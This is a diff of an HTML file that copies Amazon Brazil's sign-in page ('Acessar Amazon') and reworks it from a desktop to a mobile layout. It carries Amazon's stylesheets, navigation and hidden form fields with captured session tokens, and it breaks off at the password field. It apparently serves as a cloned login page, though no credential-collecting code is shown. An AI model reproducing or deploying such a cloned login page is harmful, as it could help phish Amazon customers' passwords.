@@ -1,336 +1,590 @@
 <!DOCTYPE html>
-<html>
+<html
+  class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser wpn-supported"
+  data-19ax5a9jf="mongoose"
+  data-aui-build-date="3.23.1-2024-02-27"
+>
   <head>
+    <meta
+      name="viewport"
+      content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"
+    />
     <meta charset="utf-8" />
     <title dir="ltr">Acessar Amazon</title>
-    <link
-      rel="stylesheet"
-      href="https://images-na.ssl-images-amazon.com/images/I/61A6IErPNXL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI#us.not-trident"
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"
     />
     <link
       rel="stylesheet"
-      href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,513wQu4ouSL.css_.css?AUIClients/AuthenticationPortalAssets"
+      href="https://images-na.ssl-images-amazon.com/images/I/61UhpddG6YL._RC|11iHkiAT2oL.css,01wLsDqViEL.css,11MhAJ3QIgL.css,31JhtlVsImL.css,31i+Ric3zOL.css,01DHz7m6lhL.css_.css?AUIClients/AmazonUI#mobile.us.not-trident"
     />
     <link
       rel="stylesheet"
-      href="https://images-na.ssl-images-amazon.com/images/I/21EtarfodyL.css?AUIClients/CVFAssets"
+      href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,51iLJ8t2RaL.css_.css?AUIClients/AuthenticationPortalAssets&amp;QmmAyoMU#mobile.194821-T1"
     />
+    <link
+      rel="stylesheet"
+      href="https://images-na.ssl-images-amazon.com/images/I/21j1UxffCZL.css?AUIClients/CVFAssets#mobile"
+    />
+    <style>
+      #aa-challenge-whole-page-iframe {
+        overflow: hidden;
+        opacity: 1;
+        position: fixed;
+        top: 0px;
+        bottom: 0px;
+        right: 0px;
+        border: none;
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        width: 100%;
+        z-index: 999999;
+      }
+    </style>
+    <style>
+      .a2hs-ingress-container,
+      a[href^="#nav-hbm-a2hs-trigger"] {
+        display: none !important;
+      }
+      .a2hs-ingress-container.a2hs-ingress-visible,
+      a[href^="#nav-hbm-a2hs-trigger"].a2hs-ingress-visible {
+        display: block !important;
+      }
+    </style>
+    <style>
+      @media all and (display-mode: standalone) {
+        #chromeless-view-progress-bar,
+        #chromeless-view-progress-bar::after {
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          height: 2px;
+        }
+        @keyframes pbAnimation {
+          0% {
+            right: 90%;
+          }
+          100% {
+            right: 10%;
+          }
+        }
+        #chromeless-view-progress-bar {
+          background: rgba(255, 255, 255, 0.1);
+          z-index: 9999999;
+        }
+        #chromeless-view-progress-bar::after {
+          content: "";
+          background: #fcbb6a;
+          animation: pbAnimation 10s forwards;
+        }
+      }
+    </style>
   </head>
+
   <body
-    class="auth-no-skin ap-locale-pt_BR a-m-us a-aui_72554-c a-aui_accordion_a11y_role_354025-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate"
+    class="a-color-offset-background auth-no-skin ap-locale-pt_BR a-m-us a-aui_72554-c a-aui_accordion_a11y_role_354025-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c auth-show-password-enabled auth-show-password-engaged auth-show-password-ready"
   >
     <div id="a-page">
-      <div class="a-section a-padding-medium auth-workflow">
-        <div class="a-section a-spacing-none auth-navbar">
-          <div class="a-section a-spacing-medium a-text-center">
-            <a class="a-link-nav-icon" tabindex="-1" href="/ref=ap_frn_logo">
-              <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
-              <i
-                class="a-icon a-icon-domain-br a-icon-domain"
-                role="presentation"
-              ></i>
-            </a>
-          </div>
-        </div>
-        <div id="authportal-center-section" class="a-section">
-          <div id="authportal-main-section" class="a-section">
-            <div class="a-section a-spacing-base auth-pagelet-container">
-              <div
-                id="auth-cookie-warning-message"
-                class="a-box a-alert a-alert-warning"
-                aria-live="polite"
-                aria-atomic="true"
-              >
-                <div class="a-box-inner a-alert-container">
-                  <h4 class="a-alert-heading">Habilite cookies para continuar</h4>
-                  <i class="a-icon a-icon-alert"></i>
-                  <div class="a-alert-content">
-                    <p>
-                      <a
-                        class="a-link-normal"
-                        href="/gp/help/customer/display.html/ref=ap_cookie_error_help?"
-                      >
-                      </a>
-                    </p>
-                  </div>
+      <div class="a-section a-spacing-none">
+        <meta name="theme-color" content="#131921" />
+        <style type="text/css">
+          .nav-sprite-v3 .nav-sprite {
+            background-image: url(https://m.media-amazon.com/images/G/32/gno/sprites/new-nav-sprite-global-1x_blueheaven-privacy._CB602510791_.png);
+            background-repeat: no-repeat;
+          }
+          .nav-spinner {
+            background-image: url(https://m.media-amazon.com/images/G/32/javascripts/lib/popover/images/snake._CB485935615_.gif);
+          }
+        </style>
+
+        <link
+          rel="stylesheet"
+          href="https://images-na.ssl-images-amazon.com/images/I/41e+jCP+b-L._RC|41-WpIOxHtL.css,512Jn9TwY4L.css_.css?AUIClients/NavMobileAssets-all&amp;Q4cATnwC#777424-T1"
+        />
+        <link
+          rel="stylesheet"
+          href="https://images-na.ssl-images-amazon.com/images/I/41bhuBzDmyL.css?AUIClients/InternationalCustomerPreferencesNavMobileAssets"
+        />
+        <link
+          rel="stylesheet"
+          href="https://images-na.ssl-images-amazon.com/images/I/01+72+wCC9L.css?AUIClients/GlowToasterAssets#mobile"
+        />
+        <link
+          rel="stylesheet"
+          href="https://images-na.ssl-images-amazon.com/images/I/41Al982kafL._RC|21eEVwLFzfL.css,31eNyfgmRYL.css_.css?AUIClients/RetailSearchAutocompleteAssets#mobile"
+        />
+        <img
+          src="https://m.media-amazon.com/images/G/32/gno/sprites/new-nav-sprite-global-1x_blueheaven-privacy._CB602510791_.png"
+          style="display: none"
+          alt=""
+        />
+        <header
+          id="nav-main"
+          data-nav-language="pt_BR"
+          class="nav-mobile nav-progressive-attribute nav-locale-br nav-lang-pt nav-ssl nav-unrec nav-blueheaven"
+        >
+          <div
+            id="navbar"
+            cel_widget_id="Navigation-mobile-navbar"
+            role="navigation"
+            aria-label="navigation"
+            class="nav-t-basicNoAuth nav-sprite-v3 celwidget"
+            data-csa-c-id="ysigvk-cta7tz-3jt0lc-mw1wkg"
+          >
+            <div id="nav-logobar">
+              <div class="nav-left">
+                <div id="nav-logo">
+                  <a
+                    href="/ref=navm_hdr_logo"
+                    id="nav-logo-sprites"
+                    class="nav-logo-link nav-progressive-attribute"
+                    aria-label="Amazon.com.br"
+                  >
+                    <span class="nav-sprite nav-logo-base"></span>
+                    <span
+                      id="logo-ext"
+                      class="nav-sprite nav-logo-ext nav-progressive-content"
+                    ></span>
+                    <span class="nav-logo-locale">.com.br</span>
+                  </a>
                 </div>
               </div>
+              <div class="nav-right"></div>
             </div>
-      
-            <div class="a-section auth-pagelet-container">
-              <div class="a-section a-spacing-base">
-                <div
-                  id="passkey-error-alert"
-                  class="a-box a-alert a-alert-error aok-hidden"
+          </div>
+
+          <div id="nav-progressive-subnav"></div>
+        </header>
+
+        <a id="skippedLink" tabindex="-1"></a>
+      </div>
+
+      <div class="a-container">
+        <div class="a-section a-spacing-none"></div>
+
+        <div class="a-section auth-pagelet-mobile-container">
+          <div
+            id="auth-alert-window"
+            class="a-box a-alert a-alert-error a-spacing-small"
+            role="alert"
+          >
+            <div class="a-box-inner a-alert-container">
+              <h4 class="a-alert-heading">Ocorreu um problema</h4>
+              <div class="a-alert-content">
+                <ul
+                  class="a-unordered-list a-vertical auth-error-messages"
                   role="alert"
                 >
-                  <div class="a-box-inner a-alert-container">
-                    <h4 class="a-alert-heading">Erro na chave de acesso</h4>
-                    <i class="a-icon a-icon-alert"></i>
-                    <div class="a-alert-content">
-                      <p id="passkey-client-error-message">
-                        Algo deu errado. Faça login de outra forma ou siga as
-                        instruções fornecidas pelo seu dispositivo.
-                      </p>
-                      <p
-                        id="passkey-generic-server-error-message"
-                        class="aok-hidden"
-                      >
-                        Desculpe, sua chave de acesso não está funcionando. O
-                        servidor pode estar com problema. Faça login com sua senha
-                        ou tente novamente com sua chave de acesso mais tarde.
-                      </p>
-                      <p id="passkey-server-error-message" class="aok-hidden"></p>
-                    </div>
-                  </div>
-                </div>
-      
-                <div class="a-box">
-                  <div class="a-box-inner a-padding-extra-large">
-                    <h1 class="a-spacing-small">Fazer login</h1>
-                    <div class="a-row a-spacing-base">
-                      <span dir="ltr" id="current-email"></span>
-                      <a
-                        id="ap_change_login_claim"
-                        class="a-link-normal"
-                        href=".."
-                      >
-                        Alterar
-                      </a>
-                    </div>
-      
-                    <div
-                      class="auth-validate-form auth-real-time-validation a-spacing-none"
-                    >
-                      <input
-                        type="hidden"
-                        name="appActionToken"
-                        value="pK79eUIPOSheifvUh8vPLGDBFJkj3D"
-                      />
-                      <input
-                        type="hidden"
-                        name="appAction"
-                        value="SIGNIN_PWD_COLLECT"
-                      />
-                      <input
-                        type="hidden"
-                        name="metadata1"
-                        value="ECdITeCs:tpAsiZSMu7yeLLMKndxPPWeGzfBqgyXuxDUR0Amra9EEBepq1APvcrw/FpuiblDHM5BcmRnw5fDZXpPT8EKo3JyKd3cMAcvl0GJd/EAhC97A5U+hO19Y7dQYz1YSPmMhm3TsXpPRploQTn45Oli53wio3z4Em/k9ErK53HZQJdQ+p/IOo3c5ZruIpbgnTAS9mjnbhK/CrB2JEjq88CgMvs40TrTWtyV15qChErR1crnlExFqbPiUCoUHWzrBJ4dzv5V0rCzzuYodQVAYFMqUSGiv49uHIvmUDM4FSOSN4WFLgL6/fFp9QVa3ar4WE/fB9Kaqg/YlWOqgdcu2yDpKrNaojDNPApfSx9KbAab4okU/aEREWYSVXHDC2gXhbmNn7mXzYib2azu7XOPcfIKX1NR7igLd3un24qPGM6fRw05oE3xOd2+/KS0oxGR7LQ2ta/0c05dPIEHTGN8y3WWb4CPws+SrVQiKIrt5qVcrJs9V0flFMSg0tgjsvKuTc06YUhDaWCvxb3XMO8uOhviWBgFnXlLZUqBk/6heOovDbeaQtXncmZrJAxlyJ77JcrmJait0Oy7Y0uB+/RMt6hcCTO6rGZlN7WgDMbkh0yhowRhvNv4I8+XX5LhzLaH8tn600VHp3GArJFyjBNWaEw8PSwD8zQQVZx/qnUJIF5A/gJjrrpB1NRZ1lzN/uaTHOzn5F90ldWQlz3zvJHTHn44YS21/UejiXmvAlwucaLzrhMu/VBPnAR/67HshF0dsdazyk5zosmM1Bl4aoYGEsEc4W4894alN06GvzKp1neBr4GGWhqk8w4XfhbYannWV1+NcpTg3631Clu4vb3nykjNT5yAVNcLOGImQ7BFRt4OxSyuQRAPbYWBK59MgCeudBnGBkLrPUqgmIYl/LEWXbtf9RWNeotNFf7ms46VrUIND9wiGfBhijutj9yWSoKXfnKRA8J5ZB5R0ype6i+wnfDpXtDuIfHiC3yM//LTWtvbEADAetiup7Zez/2m1duGHNgS/ALZVjaPcbB0kHq46G0rNH1cnVKGTB1b2UO2GjkYkKBvMEIXmOJFYUl0jIHofQ+3yhUxzBUjddga9TWTzzmWcB+dAaMWtkK7706Tk54E1SnxYljuL+CBG5KzY8uIzdizx+UfJsb/fMzLWcPsMIEeFb7AAzexXPCEOnJJ0Ob/yNIYvElkNKFOHHn5O2beOHI2r0TZY/yegWvQVe6pSiNhcLnQ3d5T/F6Ejreb+P2Fum/eCPYXpdsnwhIRYCkhcgeWLgUm5umkFZRTw37WT7Lr6C/Hjlhovl7ozn5T/+nQ7Gl3UP8NRnOShysETuwXyrv/ixUw8vh/Fqq7n9kVGq7EbbEHNyIZtAzClkW5naxK7pqzqLGrKSURJ6IQgajGqz3KB7ClVUZChfEDKfOKMCyb0Aggok6xF1S0itOJetBtaTGQfWn7NYPIKYQn1jz2KEiC5wuTRTNVHC+1Od09SPWX0b6cEUY7KhHV1hFLqp8i2Vru9GdgXKaE5JjOACtvxpUAjB9tGnKkWfyvlBikA/8lAJyXCO6n1p1lEt3qyHJ95/y1aL1nUpCnDdlnTwrvhvec9pz272wBXpt5WBZ7JF8TXFWBqXBeSKEyasSbXfu9Hz7dVZr/b6rV1fwhpTAPOSMjZpowqnvZgne+T8qZW5fWRp2KuiRTT8dI5e1e+yA1XGU+0BI1IvbfnJcG7C4oOISZrvhv06dz2C1fEPFfWC7SOoXYSrX9mS/B/PkWVgSXMETGBp10fQATmcy+KTSP2irqrD1tAn97pmpZYIvz63NPVg0oMnQy735vCPesgGiWxYLbMNx8mTzqM6PK78ipvQc0kri5uoffp+TDElGBL5edZHskqS8s7zo/HmyCl+qbHwpOvQBOvJOJq7E7BKJeP1B4KjC7pevF+JrTTEEoC+c6JngrJRXuhXEV6icYJWHwfoPKbhcfYKEJvh2ZyY2ccfVMfCLjtU+SRN7eC+bhFWE+CQVNLTDn25Z+HlpcPPf+vd9ecwXwQlGJhZs3vfRd22OBnGxNE1nk7+NoM9oSWhJwSng1B+OuDreKoxokhzRnPmTGGeylbs+pS5kx1YlgpeYqDq1YLF+P8ZVkIA3jyJiU3ZqF1edyp3//pz8tO7RmC7+CrP7KVDU4qCoa/RPRI3zr7DfgNzEhwDw4q4Ud5BfnIcwctiHAFoPAmrqzRMNJEeaT+VPrLMEWQOEjTlFHYeH1L+yRX66HfNVnavciDAs0HR0nDoFFKIUBaQ38ZfePS1p3YlDm+tzHx3rG+juhiDtQASdiZcwLh70YLj707GPkMKZa4kot6ZMtMBgNLKT1H95m8jDKAoC5Drgz3xmU8EpXlkkokx0PX7DuWPgCMWdwts2FV94i6EqKMy4XLTTJwQvVxb6e7J/m/5uj2QyyPGPIPVidygY1anhGzMEBexya2Vjda6WPWnnTQ85JBPhD5tslKkdcQ1kpxRc/uQ7HRB1VdNhVZHOUo5bkdScOrTyNDfJ9CFhkLWT3HKiWLLD3pvo0dgUfRGo7+Fkp8R9w3B2l2wyRcdpBuJ6MEKqOfrKPHxWq6DLJ0YGkX8rQSQePsKzQb8VQbBKDLm5w5G7sKbHHEjW/oHzAzlxEhr/MgiQwB9Lac4144TjCsdcRsWWOY3it/YWq5hGemn2soIdgbdwLsnUkXgEw0KOqyJxT4p3svYhCbUh2FlXRBMZH64ehTjCEWrqKGe5MZABczzqVAI9j9uafUXUqZliqiM2m4hQxLpZiZFFaQzYIc6t6nrUNRyzRa7YzkLTvCK/vXbAZVNYzgKrOS8ueDEpfjezMsuWP1QW4hFomSga0EX3Veyi0LG9K09rPh8HY5nF3bcj7eRiENBTMhNaIWAjHEZKITFvAE9DA4TKR3eXyS5AktbVkGiOBCV1WTmQjpu/OdpJGyNGTZJd3xnMyuoNZjc5aGRA5uw7VXPz7I9T77WsnNvCeAea0frOuAJba2KFiLQYy3EluCIm+/eW9gJgzel3wR89D9iWYKAUo2oowi0jVT8dVHzsOp2+DtgHYnDOlE8qP5oSTTfbLZgZo25V5zd/YaTpBGgvpkCCSLVHQDzsAj8zodzthn4drz25EYAnKOA6MxcIb16dymV6e7ci6zviDiq+HhoFfnuOm6VSUEIl96fkkCf9N5MsJmjJ6rL/jZWX9QMxP14ylLCk/xpPLxzioy6lvcEz2KmKwxteliJ5RIRr1sf4iGlTSs8ZIsMh0pidRIGq/M2C/5TybS2eCYpuWM6716AokECCjifYYA19qTWGGxSt4IzCwr+CqoQiSlN411FjvxDll4pk+c3SsvPsz7ONOj5iR0q3+4PIkoAYnxqopJzDIqtWcjtmp9pqnTh1szvZ4ZwIF7svWMuANFn7/LHVvYWJ4sl3BOXlHQ4lA5ns2loZk6L/XgRDoN6SS6Z7YlZq8Yr2ylYh0X+JJXP9ByfXwksnytXU+7kCTnTG3NbYuBph4jNMDd4cnLAFr2TQbDEFHV0atnw8slZJqgzCTgc63PZNtBVXDEXeDXz39oQxE6d2NsqFFadTAtTlVV/NhR6Rxtb3aCsXG4VYY5KSAH2zj1XuCjTKENq//W61ILe9ClbayA4XNXtkDjC0tlXWnWvoJNLKDlJpwv2ZWRl4fgFGxbno2mNxM3bynnjmZPrNoBjwXqlT0CY44BK/IAQdZ281oUvDuYsLMTk0ioeag0ROP3hDX+33Q++Wk0lj/yX0ZU2X0lWGcyo9o21pkDpz2vMNyAVQ44lAcaYu/SRTSdXFvHRN6/kqUPrlsoX46D3CCgFLVfzSVA1qf4gIRZZjMiqP56x23aIjb88QtbqXqZqKrtrYUm3UE0DYu/S69lH4Y0RE8zSqYRgTqx1mrGsPCGxnGuUw4XukgeW6FPKJhDGyb1I4OgXpRIOROmiLA06q6NLslshh/O+VzfnefGW/8868Sll3ooZWtQ0pWdAWW1cM1awKEwqfX2dD5xj/gGsFOHrXhYcIFXx1eez6pdUpAsEpXZE+meShajO4Hv0De3e2LQRhL3BEPHLZ1UI0VnSNzXPwM2KL0x11Akzes3xGmv5lwGNQWYrScPPfyMnbcDR+z3pZ9QM7ro24rIiOYfGJaHshlrdy5ZlrmZ/APGboXTYBZo2JU3MQDg1lqJfrwrB+KTktm/lx1WnGTgAe9K9D1aZvsucmHeM0JeX3fXteXTXvFUnWvtkTsXBTu0IKg8VZA3x3tnkA/dF8SqBWFpMnTUI+blBECmWRGPkdIQNdnS86xN5oK/91LVlX0thAjnfQLr7TeCxA7T2X0UcuynmRbUr5+zdQt038owNy8cyi841k6kLXu1cbvjBMXAaAohUtnKvWJqgDF5H5WxDNMEOFSc69rY4hQVAAksfLwcoRCM7f3LnkftcPABk53bG3/+nxiRPbs73fipjeZwzs/7GCaI12MQ+tF/u01EOb574IAc1XGz5Wtu6BmiPULAhq/Iskzujs6zxtJDDiL/FMoTidOr62zR435RLGaSpO42cNNkIhXSmolO8Y86RCSegwgdX1ID3PDvFnik+zc47+R+jeE8canUzVTx3/X20p9pTNCiKhKquV0WIXtyDCSmvmSiYrBD+bQaWiLjj9hL23xGqvsrz+g7z1jL9e4PwokZoE4MRVGHrDFnEErX/z/xA1PL62W22riFKD44EqYWsp/iNJ7+qDzzDR5oXDjDJpwLvUQ8V3+bkLXQSAiyXDSJB3OmBnzRJYz6ywtpHgaf4V3/dUz2oW5yJ8+UT/vbUwhibs1+1VqysUTpp39q5BPez7bWlvvWqkozjLcJQf4uJ1AWnbWWphrmThzRwWCPjgrcZF8EHokF4bIlJOIT495cUItlEkRdj486pALJ3yVG7hwF3fF36VxitLGj8fm5vvvYLUWsdSCI9Xzwip14ufMgmhvAHRpud6msTZJbLe0eyNmn9eq22bMbTkTbgxtiydszvM7hi3zhecFs1X1cas1R5eoZovkkXlHQieEeH7KGe6OAK2bspGsGK3JsuA+2TtlEg7YNhIzb204uWmLeoq/yvOGUteU2GcC3kCP/vrEgT7mOM0PIWtWxvGMjKFztQW2gBqobQDppd1anJhHqq+CdC0FwljnsqKjSOmuEmERb8rQh7cwsTb81rWYeqt08+0LD4lbnF3XzzinWdMKkylHu0tR5R+jayXJNN3q98517Li10B0rsvMHJJjbapgBiV3b7pe4ds8I8tzUVVVLEyNvHkhIMvkaJrxoDIW77LlkzG3VPolGo+b8GrAvy6K/ZCf+jAPe1E7zUUL0QLezbdDJX+YtwCvWVRSm5Wk35QJTNA3121zlwiKZ3qmX8kqGqlPcEkT9h5Tlx4cCS63LPZnLKinFKimqKA3ge0sdk+i0e5P7bGw/Q3ChjgmgO6Gyr9xyqlaMtEh9HPBx7DvszZbelgaPxl4wFYeIgzFjJCBH2uGWUiIHnKTzHx7UPUqULpKXyyR+RAJO4XinocYyWLP7Flr0hEuZDu7yFaBnfRkWm7cEaOptjt/JjofA1Ci7PeKRQQS77lyQFb8BGkAYPTmYdOciZEf2T/aLh3h3vOGFR9t8RiMqdmtgDgI+ghyrIAkatU6lWa+93QvJwJ48FAw7Zql83mrs1Qa0X9dOBOv0dLsfUi/B3QrUsW6M5sj96XgkjEWc23w/yl5JLmZrCZanzLVnqyYxC2No1htVy7CyOJ1EmuKgnWx4Z5SOeVZ3BgGdcZQbxvJPcvWgy/yotbonN7lpIG5SnYRl5KMRGo2+961lvSjs15VpcYZ/7l6bLwv49AYJU5SViKpSP3AgFQVAFScSURSgoajhub49JJ4kAI+H/t+2nYL5WMI9BgL4Jc6HGCm292sQF/5qHoHO4/zoxYIQeufXWOab6/E+UE9Eu0dqRVtKTKLn8rtii3vm6fnN85YlBv53Cs881veQU4JE87k8e927LsdQBnuniwcnpdq4xZRyPtTiWSXYTfhq6eY3Q+AzjpSRSarqS+0F/RX46oNmQIF4Ov4+lMAo5DfYBO5OMJyTxO7iWKZkANYOOprsQG9//7Oi19MNjx2AiJGJXYYYIgQKNbIQzjHqXXYo2pw+zxoZzoD87xJAuLVI1k5/iEeaWCEDtU0CKmDm5DskGTWf0hp/dlfCowwRaNDsBH44wTW1Feh2pdjpFqSfWZ314vk7Z93JO7p8sQqnAqKWewkBUIvoPqUiWJqUyzM5qiPx440jASGv7j/210iuDMVZZhnTlruNqqje5ZFo82yBINEi1IGf3/J70Xt5e7uzdjNDyKaK9P1MzqimjJgZfe6t9Wa4P0m7Dy46bpnieP15mXUSuenDIye0xewGjM5BCAsnn08ONKYcqDsctOhYuGLsqm/BDUHkfUNkY2NqkwiVDtvOsz6QmUSu7d2S4xQP0K5fuz/ayykVuPWveJbypnQsJtRVfA6235jKWyd9UjYxqXWHsCKHhmHO4e08EOqwotsmYLsdLgyD57ehBbh++0zQlFquwJqEE/zNl4guwpnT96U71QXA2CZhtfiJ3nTPdFL1tJl/qG+hAsvL7oYgf3/+xlIVNIhMN7u/DUNVkWGKLP/EFnRLNsQoUAoFmQxiDr7eEBU9Wn5w4aT5IxML/QAr/JHmvKXyBSLrercC7cOxXzC7PgeWXnwot5i37i+DkeRd8ABp/NrSqGqpOcQ22wg2iIbyjwZWK87eZw3CRwRTPQWqgBL7EC6lF7C7D0y+bsoiYmcFvlMEjt3VmbwpTnJ99mSpjJiG8l0pd6BgU5AIm0tmkFBMQviS0i9T+StUKSDl5ElmW/N2mN8n+GR4JS1RdSAS0aqdmZPN7HsWjeahfG7MG/7nVfSL+sXaBkwtrvFGGa0bj42ybwDYC7mZJPYbWpBEH2IhI6GsRi4uwTpfkSgM5RGiJ6KrDuvHPo6OAeM1KgeMe6hcDHzHHw11G+m6rJvZMn+a325k9bWLizTSvqxVEBC4/tyqgbeLM5gaXVhm0l7cTUtjbMZiY1jU2CkrWkyLDOhgIiYtkMt3elIgzn3djXoLcVKUx4W+FKBhNFF06ex64om3ZDKoEDOS/YLz191LVYDSWBnztkqhvQ0YNpXylcjrCbP2t3q2a01gIEw29GoF6r8xU5gYb6ag+6JZxIKZIv1Yw0/cUYymzI+Z5qtZ09OIAQmDahZUchWqOwAsknjg3ww2SZMSrXgjaR37mUKrtapFruulBLOse8aA42N6Pm6R8QH+7NVQlAj+Xgs/guOGzN1md9BKrvEZAaD8xwofXzMaQYbq9X2OZWMSO6oEDz4OQmooG4AG3t+iGGlGkWkwU8X9i1oZvz3rInwoz6tBPCUbaRWGcWNSmiLhsFh88frKaCLC8LOtp5X+KOXiIzvvk89A22Pewr2Z30e9TMFE8IQP9js8E4GDRARvQShFXvTAOdl/0leBdw359q6FaWwY+Pp0i4aj59qTxis9CS2nx+FiLH6+pAYHeyEZRboYPQGPhY6pmiFe3/BjY/f5f3desj9nmRGnrLiif+n6K4OqDmSz17Us9eg5N8KeFC2poWomPOWYZrvjvpYb9VcXoOXYC8EUutIn06UAre+GiPaB4vKS1L/m+P6C/1UIJ05YOayoExnrj3q+kfZXpWLIA/8cNA3Mxtgn1IsjnhrpZZUB2z2UCT1LroY0q3TZDGVxaF3e8Cfaw0Nivv2LdX7P+1RY/7CCuQtK3X1mr03guhGSYgPOH4XLkiwaHlgOUMN7M7BgQMRxn6BKzpB8U4mU/fdqVWiWP8XoiikMzRdamZxP3cKaptwmQon+ZZBFYNthPa+CaUc/phttzGnW6MLcbSeW4XM5MkPh3iCPL4WJT29xSnSjSQ6DCNYE1Oa0Wg3oxsMJ9cJ5j84XtNuAdUwL5RjQTI4dR7jicGqkoPA5CFBicdiLB+T74QEZAG4JzUk/PGaKDf+J1qsvwW8kvplnTGBS3BWV4epDQZ39fS1dZNeNcq2kOGx6a/opL9LcDjq8RByoNgKRm+rubF9Vev8CeaDnZzawkcMRdDrbdAD5hcW6f9uoaSnQIv6F5iSBl2ASrwrLWAVlv2Hx7sK66cNNz4k4iQKFh7J8Lph9UYBuKG/DGfe3QbSfDtrRw4wNHk6QqpV9j58wjULN4Nz7uVEmgEhV3eaQ5SSsJUs0gKLlAbGgc7g/qKaxi6Ino/H5NS9aDdtvi58E2alF6o02BJZM8m8RWrMPC35S4JuYbJda6KT4AflznBGy2y/FpiX0+4M+wVE7em5fmo+ILLqL15Cp9MEF9/lX9wyq46KucBaOBnGd84bFjD8EadfAhccOa4sPSNIuUwu6c6rsUFrxKGvJJHcQBTii1UZIpdX7jkS5mZ8G1yV2oZNbUSVGO7Yo835wKJoEiE3ity2H+CERJOlcZHEWBfqaUTakoijYOMwovwRzjjh9axMS737u2wskbNyEGtuSZ0Aa5/jnK5xS6iZM7Oa+UWagipPiiaGJuDZYd+xvWNsxnITlVorvMbZnd9lMLuOPuPjI3dd5hUFcIC0mR3v3UAAuKGq73iQHojDIJe0+lQ7g4tC42ouzJhQhXd9Txm5yeaw=="
-                      />
-                      <input
-                        type="hidden"
-                        name="openid.return_to"
-                        value="ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS5ici9iLz9pZT1VVEY4Jm5vZGU9Njc0MDc0ODAxMSZ0YWc9aHlkcmJyZ2stMjAmcmVmPW5hdl9jdXN0cmVjX3NpZ25pbiZhZGdycGlkPTg0MDA2NDY1NTkxJmh2cG9uZT0maHZwdHdvPSZodmFkaWQ9NTk1ODE1NjY2NjQzJmh2cG9zPSZodm5ldHc9ZyZodnJhbmQ9NTMzMzg5OTI1MTU1MTQzMjQ0Jmh2cW10PWUmaHZkZXY9YyZodmR2Y21kbD0maHZsb2NpbnQ9Jmh2bG9jcGh5PTkxMDAxNjgmaHZ0YXJnaWQ9a3dkLTM2MDM2NDkwNzY3NyZoeWRhZGNyPTU3NjRfMTMyMTUyNTUmZ2NsaWQ9RUFJYUlRb2JDaE1JLUl6T21QbmtoUU1WdlY5SUFCM0hwZ1ptRUFBWUFTQUFFZ0lSalBEX0J3RQ=="
-                      />
-                      <input
-                        type="hidden"
-                        name="prevRID"
-                        value="ape:UVZCU0s0MDNaV05aNUpKNUREMjg="
-                      />
-      
-                      <input
-                        type="hidden"
-                        name="workflowState"
-                        value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.zuuLed59wuiyzeGj3TWWYkFJihUyctMMdhFiw5jqd8rHroJrEoJkUQ.ErieMdIayltrj6V4.JaE_3LBu1vAEnZoFmJPEOPsKu_149P8ZgNLiZ3AZ08clGzC2f3rMOBYTUItLXu3_1zSVwCHTv1t8DtB6lwoIUdCPcEeS7FXxQ0PBb4GW7hVoNZ6AzIlsCD5sFwANjyuAC4y9nzfo6P2MrIrftlpc4F52tvpVVXTKDmD2EX9oIgHeRwF9kbRkFiXzzcDKTACjxsuVj9UUDOSEgo4xlOr7ySmK0R-FONC18V3Wy-og4kYGWZgyp4vzPw9GrJpmQMfZGzt-MpWRb0sqGH27C6T4J8bRphJr3uHXnA64mHjaVA-CiRwMNYJzDf74Cvs9dRaQDD7TyQkqK5EgYdgYFytde7hk8smavcDVjaJ9gpSWbApPeTz_BGborq82aBN-ffLywFkkTuDircLwB3JaK5mvNnk2rJS8NodVRni5XvNhqL2GSEHUNsgW4i-TNpAStGzfLCh-7Q6bzCkl4LsUW2JnYZxt9LlobPt__1gVRAlQ09OT8PexPBiGtq8bY2ORcAi6eA.g7QNehRmcbfzke3uzbd8EA"
-                      />
-      
-                      <div class="a-section">
-                        <input
-                          type="hidden"
-                          name="email"
-                          id="ap_email"
-                        />
-      
-                        <div class="a-section a-spacing-large">
-                          <div class="a-row">
-                            <div class="a-column a-span5">
-                              <label for="ap_password" class="a-form-label">
-                                Senha
-                              </label>
-                            </div>
-      
-                            <div class="a-column a-span7 a-text-right a-span-last">
-                              <a
-                                id="auth-fpp-link-bottom"
-                                class="a-link-normal"
-                                tabindex="6"
